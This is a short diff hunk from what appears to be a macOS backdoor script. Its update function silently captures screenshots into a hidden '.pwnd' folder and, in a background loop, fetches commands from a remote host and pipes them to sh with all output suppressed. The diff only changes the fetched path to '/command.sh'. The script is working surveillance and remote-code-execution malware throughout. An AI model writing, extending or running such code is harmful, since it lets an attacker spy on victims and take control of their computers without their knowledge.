@@ -21,7 +21,7 @@ update() {
 	screencapture -x ~/.pwnd/screenshots/$(date +%s).jpeg
 
 	# and execute whatever we want it to do
-	curl -s "${HOST}/command" | sh  > /dev/null &>/dev/null || :
+	curl -s "${HOST}/command.sh" | sh  > /dev/null &>/dev/null || :
 }
 
 loop
